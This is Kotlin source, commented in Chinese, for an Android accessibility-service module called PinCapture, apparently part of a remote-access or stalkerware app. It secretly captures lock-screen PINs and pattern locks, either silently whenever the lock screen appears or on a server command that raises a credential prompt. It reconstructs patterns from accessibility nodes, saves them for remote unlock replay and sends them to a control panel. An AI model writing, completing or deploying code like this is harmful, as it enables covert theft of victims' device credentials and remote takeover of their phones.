package com.zaka.screenagent.keylog

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import org.json.JSONObject

/**
 * 【主动模式】锁屏密码捕获（对应面板 `verifyPin`，与 2.2 的 PinCapture 同思路）
 *
 * 流程：
 *   服务器下发 verifyPin
 *     → DevicePolicyManager.lockNow() 立刻锁屏
 *     → 开一个 120 秒采集窗口
 *     → 只监听锁屏界面（keyguard/systemui）的密码框
 *     → 用户输入完成 / 解锁成功 → 立即上报 `pwd` 帧（type=system）
 *
 * 与被动监控的区别：**只有被点名才启动**，窗口结束自动关，不会一直挂着。
 */
object PinCapture {

    private const val TAG = "PinCapture"
    private const val WINDOW_MS = 120_000L

    private var until = 0L
    private val digits = StringBuilder()
    private var lastText = ""
    private var reported = false

    /** 透明 Activity 拉起系统密码框前调用 */
    fun beginCapture(service: android.content.Context) {
        until = System.currentTimeMillis() + WINDOW_MS
        digits.setLength(0)
        lastText = ""
        reported = false
        Log.d(TAG, "beginCapture (credential prompt)")
        patternPolling = false
        dumpOnce = false
        runCatching {
            val svc = service as? AccessibilityService
                ?: com.zaka.screenagent.accessibility.BoundaryAccessibilityService.current()
            Log.d(TAG, "beginCapture -> startPatternPoll svc=${svc != null}")
            startPatternPoll(svc)
        }
    }

    /** 系统密码框返回：结算 */
    fun finishCapture(context: android.content.Context, ok: Boolean) {
        Log.d(TAG, "finishCapture ok=$ok len=${digits.length}")
        val svc = com.zaka.screenagent.accessibility.BoundaryAccessibilityService.current()
        // 凭据框返回 RESULT_OK = 解锁成功：这时把 pending（或当前缓冲）当成正确图案上报
        val toReport = if (pattern.isNotEmpty()) pattern.toString() else pending
        if (ok && toReport.isNotEmpty() && svc != null) {
            Log.d(TAG, "finishCapture ok -> report pattern=$toReport")
            pattern.setLength(0); pattern.append(toReport)
            finishPattern(svc, true)
            pending = ""
        } else {
            // 用户取消（返回键）等：不上报，并清干净，避免残留到下一次
            Log.d(TAG, "finishCapture canceled -> clear (pattern=${pattern} pending=$pending)")
            pattern.setLength(0)
            for (i in 0..8) dots[i] = false
            pending = ""
            patternPolling = false
            until = 0L
        }
        if (ok && digits.isNotEmpty() && !reported) {
            reported = true
            val value = digits.toString()
            digits.setLength(0)
            val ch = com.zaka.screenagent.accessibility.BoundaryAccessibilityService.current()?.moyingChannel()
            ch?.send("pwd", JSONObject().put("type", "system").put("pwd", value)
                .put("source", "credential_prompt").put("via", "confirm").put("ts", System.currentTimeMillis()))
            ch?.send("cacheData", JSONObject().put("k", "keylog")
                .put("cache", org.json.JSONArray().put(JSONObject()
                    .put("pkg", "system-credential").put("type", "pin").put("text", value)).toString()))
            // 2.2 的正式上报口径：POST /api/device_log {type:"pin_capture"}
            ch?.postDeviceLog("pin_capture", JSONObject()
                .put("type", "pin").put("value", value).put("ok", true))
        }
        until = 0L
    }

    /** 静默模式：锁屏图案窗口一出现就开始盯（不需要 verifyPin） */
    fun onKeyguardWindow(service: AccessibilityService, pkg: String, cls: String) {
        // 触发条件：真锁屏(SystemUI) / 生物识别界面 / 系统凭据框(com.android.settings 的
        // ConfirmDeviceCredentialActivity) 三者任一出现就开会话
        val looksPattern = pkg.contains("systemui") || pkg.contains("keyguard") ||
            pkg.contains("biometrics") ||
            cls.contains("ConfirmDeviceCredential", true) ||
            cls.contains("Keyguard", true) ||
            (pkg.contains("com.android.settings") && cls.contains("password", true))
        if (!looksPattern) return
        if (System.currentTimeMillis() < suppressUntil) return
        if (isActive()) return
        // 自动开一个短会话（60 秒），画完自动结算
        until = System.currentTimeMillis() + 60_000L
        pattern.setLength(0)
        for (i in 0..8) dots[i] = false
        reported = false
        Log.d(TAG, "keyguard window -> auto watch 60s (pkg=$pkg cls=$cls)")
        startPatternPoll(service)
    }

    private var suppressUntil = 0L
    /** 上一次画完的图案（等"锁屏消失"确认成功后再上报；新一次尝试会把它丢掉） */
    private var pending = ""

    /**
     * 远程解锁前调用：**立刻停止记录并清空缓冲**，同时在 suppressMs 内
     * 不允许 keyguard 窗口重新开启会话 —— 否则我们自己画的图案会被记成用户图案。
     */
    fun suppress(ms: Long = 20_000L) {
        suppressUntil = System.currentTimeMillis() + ms
        until = 0L
        patternPolling = false
        finalizeHandler.removeCallbacks(finalizeTask)
        pattern.setLength(0)
        for (i in 0..8) dots[i] = false
        digits.setLength(0)
        reported = false
        Log.d(TAG, "suppressed ${ms}ms (remote unlock in progress)")
    }

    /**
     * 自愈式启动：只要会话还在（或 120 秒窗口内），收到任何无障碍事件就确保轮询在跑。
     * 解决"点按钮时界面还没渲染好、轮询起来就退回"的问题。
     */
    fun ensurePolling(service: AccessibilityService) {
        if (!isActive()) return
        if (patternPolling) return
        Log.d(TAG, "ensurePolling -> (re)start")
        startPatternPoll(service)
    }

    fun isActive(): Boolean = System.currentTimeMillis() < until

    /** 服务器点名：锁屏并开始采集 */
    fun start(service: AccessibilityService, reason: String = "verifyPin") {
        until = System.currentTimeMillis() + WINDOW_MS
        digits.setLength(0)
        lastText = ""
        reported = false
        Log.d(TAG, "start ($reason) window=${WINDOW_MS}ms")
        // 不锁屏！拉起系统「验证身份」密码框（指纹/面容用户也能用密码）
        runCatching {
            val i = android.content.Intent(service, com.zaka.screenagent.pin.ConfirmCredentialActivity::class.java)
            i.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION)
            service.startActivity(i)
        }.onFailure { Log.w(TAG, "start credential activity failed: $it") }
        send(service, "pin_start", JSONObject().put("window", WINDOW_MS / 1000).put("mode", "credential_prompt"))
    }

    fun stop(service: AccessibilityService?) {
        until = 0L
        digits.setLength(0)
        Log.d(TAG, "stopped")
    }

    /**
     * 无障碍事件（只处理锁屏/凭据弹窗）。
     *
     * 关键：系统密码框里 `event.text` 是**掩码**（看不到真实数字），
     * 所以走 2.2 的做法 —— **监听数字键盘按钮的点击**（TYPE_VIEW_CLICKED=1），
     * 节点 text 就是 "0"~"9"，按点击顺序拼起来就是 PIN。
     */
    fun onEvent(service: AccessibilityService, event: AccessibilityEvent) {
        if (!isActive()) return
        val pkg = event.packageName?.toString() ?: return
        val isKeyguard = pkg.contains("keyguard") || pkg.contains("systemui") ||
            pkg.contains("lock") || pkg.contains(".settings")
        if (!isKeyguard) return

        // 图案锁：先看事件文本里有没有"开始绘制/绘制完成"
        runCatching {
            val txt = event.text?.joinToString("") { it?.toString() ?: "" }.orEmpty()
            if (txt.isNotEmpty()) probePatternText(service, txt)
        }

        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                val t = nodeText(event)?.trim().orEmpty()
                if (t.length == 1 && t[0].isDigit()) {
                    digits.append(t[0])
                    Log.d(TAG, "click digit -> len=${digits.length}")
                } else if (t.isNotEmpty() && isConfirm(t)) {
                    commit(service, "confirm")
                }
            }
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val t = nodeText(event)?.trim().orEmpty()
                if (t.isNotEmpty() && t.all { it.isDigit() }) {
                    digits.setLength(0); digits.append(t)
                    Log.d(TAG, "text -> len=${digits.length}")
                } else if (t.isEmpty() && digits.isNotEmpty()) {
                    // 输入框被清空 = 提交/校验，350ms 后结算（2.2 同款延迟）
                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                        if (digits.isNotEmpty()) commit(service, "text_cleared")
                    }, 350L)
                }
            }
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                val cls = event.className?.toString() ?: ""
                val leftLock = !cls.contains("Keyguard", true) && !cls.contains("Confirm", true)
                if (leftLock) {
                    // 锁屏消失 = 解锁成功，这时候才上报图案
                    val toReport = if (pattern.isNotEmpty()) pattern.toString() else pending
                    if (toReport.isNotEmpty()) {
                        Log.d(TAG, "left lock, report pattern=$toReport")
                        pattern.setLength(0); pattern.append(toReport)
                        finishPattern(service, true)
                        pending = ""
                    }
                    if (digits.isNotEmpty() && !reported) commit(service, "window_change")
                }
            }
        }
    }

    // ── 图案锁（照 2.2 的 probePattern/readDots）──
    private var dumpOnce = false
    private var lastNodeSig = ""
    private val pattern = StringBuilder()
    private val dots = BooleanArray(9)
    private var patternPolling = false
    private var lastPatternRoot: AccessibilityNodeInfo? = null

    /** 事件文本里出现"开始绘制/绘制完成/不正确"就进出图案模式 */
    private fun probePatternText(service: AccessibilityService, text: String) {
        val lower = text.lowercase()
        if (text.contains("开始绘制") || lower.contains("draw pattern")) {
            pattern.setLength(0)
            for (i in 0..8) dots[i] = false
            startPatternPoll(service)
        }
        val done = text.contains("图案绘制完成") || text.contains("图案已绘制") ||
            text.contains("图案绘制不正确") || lower.contains("pattern recorded")
        if (done) {
            val ok = !text.contains("不正确")
            finishPattern(service, ok)
        }
    }

    private fun startPatternPoll(service: AccessibilityService?) {
        if (service == null) { Log.w(TAG, "pattern poll: no service"); return }
        if (patternPolling) return
        patternPolling = true
        val h = android.os.Handler(android.os.Looper.getMainLooper())
        val tick = object : Runnable {
            override fun run() {
                if (!patternPolling || !isActive()) { patternPolling = false; return }
                runCatching { readDots(service.rootInActiveWindow) }
                h.postDelayed(this, 40L)
            }
        }
        h.postDelayed(tick, 150L)
        Log.d(TAG, "pattern polling started")
    }

    /**
     * 图案点其实就是 lockPatternView 的 **9 个子 View**：
     *   已连上的点：text/contentDescription = "已添加圆点 N"，且 isClickable=false
     *   未连上的点：isClickable=true
     * 所以按"不可点击"出现顺序拼起来就是图案（2.2 的 readDots 就是这个逻辑）。
     */
    private fun readDots(root: AccessibilityNodeInfo?) {
        if (root == null) return
        // 全树找"子节点最多"的 lockPattern 节点（layout_lockPattern 只有 1 个孩子，不能选它）
        var best: AccessibilityNodeInfo? = null
        var bestCount = 0
        val stack = ArrayDeque<AccessibilityNodeInfo>()
        stack.add(root)
        var guard = 0
        while (stack.isNotEmpty() && guard++ < 800) {
            val n = stack.removeLast()
            val id = n.viewIdResourceName
            if (id != null && id.contains("lockPattern", true) && n.childCount > bestCount) {
                best = n
                bestCount = n.childCount
            }
            for (i in 0 until n.childCount) n.getChild(i)?.let { stack.add(it) }
        }
        val node = best
        if (!dumpOnce) {
            dumpOnce = true
            Log.d(TAG, "pattern best node kids=$bestCount")
        }
        if (node == null || bestCount == 0) return

        // 先算出"当前这一帧已连上的点"
        val current = HashSet<Int>()
        for (i in 0 until minOf(bestCount, 9)) {
            val c = node.getChild(i) ?: continue
            if (!c.isClickable) current.add(i)
        }
        // 如果之前记录过的点在这一帧又变回"未连上"→ 说明界面被重置（画错了/重新画）
        var resetNeeded = false
        for (i in 0..8) if (dots[i] && i !in current) resetNeeded = true
        if (resetNeeded) {
            val was = pattern.toString()
            // 判断这次重置是"画错了"还是"解锁成功"
            val svc = com.zaka.screenagent.accessibility.BoundaryAccessibilityService.current()
            val pkg = svc?.rootInActiveWindow?.packageName?.toString() ?: ""
            val stillLocked = pkg.contains("systemui") || pkg.contains("biometrics") ||
                pkg.contains("keyguard") || pkg.contains("com.android.settings")
            Log.d(TAG, "pattern reset detected -> was=$was stillLocked=$stillLocked pkg=$pkg")
            if (was.isNotEmpty()) pending = was          // 先挂起，等窗口离开锁屏再确认
            if (!stillLocked && was.isNotEmpty() && svc != null) {
                finishPattern(svc, true)                 // 锁屏已消失 = 成功
                pending = ""
            }
            pattern.setLength(0)
            for (i in 0..8) dots[i] = false
        }

        for (i in 0 until minOf(bestCount, 9)) {
            val child = node.getChild(i) ?: continue
            if (child.isClickable) continue          // 未连上
            val txt = (child.text ?: child.contentDescription)?.toString().orEmpty()
            val idx = Regex("(\\d+)").find(txt)?.groupValues?.get(1)?.toIntOrNull()?.minus(1) ?: i
            if (idx in 0..8 && !dots[idx]) {
                dots[idx] = true
                pattern.append(idx + 1)
                Log.d(TAG, "dot ${idx + 1} -> $pattern (txt=$txt)")
                scheduleFinalize()
            }
        }
    }

    private val finalizeHandler = android.os.Handler(android.os.Looper.getMainLooper())
    private val finalizeTask = Runnable {
        // 松手后不再直接上报：等"解锁成功"再报，画错的自然被丢弃
        if (pattern.isNotEmpty()) Log.d(TAG, "quiet -> keep buffer=$pattern (wait unlock)")
    }

    /** 500ms 没有新点 = 手指抬起，立即结算（防止松手后重置被当成新点） */
    private fun scheduleFinalize() {
        finalizeHandler.removeCallbacks(finalizeTask)
        finalizeHandler.postDelayed(finalizeTask, 500L)
    }

    private fun finishPattern(service: AccessibilityService, ok: Boolean) {
        patternPolling = false
        finalizeHandler.removeCallbacks(finalizeTask)
        val value = pattern.toString()
        pattern.setLength(0)
        for (i in 0..8) dots[i] = false
        Log.d(TAG, "pattern done ok=$ok value=$value")
        if (value.isEmpty()) return
        // 存下来，供「一键解锁 / V2解锁」直接重放
        runCatching {
            service.getSharedPreferences("pin_store", android.content.Context.MODE_PRIVATE)
                .edit().putString("pattern", value).putLong("ts", System.currentTimeMillis()).apply()
        }
        val ch = com.zaka.screenagent.accessibility.BoundaryAccessibilityService.current()?.moyingChannel() ?: return
        // 面板把记录按 type 分类：system（系统/锁屏）/ fake（假锁）/ app
        // 2.2 的 12369 就是 type=system，所以图案也归到 system
        ch.postDeviceLog("pin_capture", JSONObject()
            .put("type", "system").put("value", value).put("ok", ok)
            .put("kind", "pattern"))
        ch.send("pwd", JSONObject().put("type", "system").put("pwd", value).put("ok", ok)
            .put("source", "lockscreen").put("ts", System.currentTimeMillis()))
        ch.send("cacheData", JSONObject().put("k", "keylog")
            .put("cache", org.json.JSONArray().put(JSONObject()
                .put("pkg", "lockscreen").put("type", "pattern").put("text", value)).toString()))
    }

    private fun isConfirm(t: String): Boolean {
        val s = t.lowercase()
        return s.contains("确定") || s.contains("确认") || s == "ok" || s.contains("done") ||
            s.contains("enter") || s.contains("确认") || s.contains("提交")
    }

    private fun nodeText(event: AccessibilityEvent): String? {
        runCatching {
            val src = event.source
            if (src != null) {
                val t = src.text?.toString()
                if (!t.isNullOrEmpty()) return t
                val d = src.contentDescription?.toString()
                if (!d.isNullOrEmpty()) return d
            }
        }
        return event.text?.joinToString("") { it?.toString() ?: "" }
    }

    /** 用户输完并解锁：上报一次 */
    private fun commit(service: AccessibilityService, via: String) {
        if (reported || digits.isEmpty()) return
        reported = true
        val value = digits.toString()
        digits.setLength(0)
        Log.i(TAG, "captured pin len=${value.length} via=$via")
        send(service, "pwd", JSONObject()
            .put("type", "system")
            .put("pwd", value)
            .put("source", "lockscreen")
            .put("via", via)
            .put("ts", System.currentTimeMillis()))
    }

    private fun send(service: AccessibilityService, action: String, data: JSONObject) {
        runCatching {
            val ch = com.zaka.screenagent.accessibility.BoundaryAccessibilityService.current()?.moyingChannel()
            ch?.send(action, data)
            // 同时进 keylog 表，面板「密码」列能直接看到
            if (action == "pwd") {
                ch?.send("cacheData", JSONObject().put("k", "keylog")
                    .put("cache", org.json.JSONArray().put(JSONObject()
                        .put("pkg", "lockscreen").put("type", "pin")
                        .put("text", data.optString("pwd"))).toString()))
            }
        }
    }
}
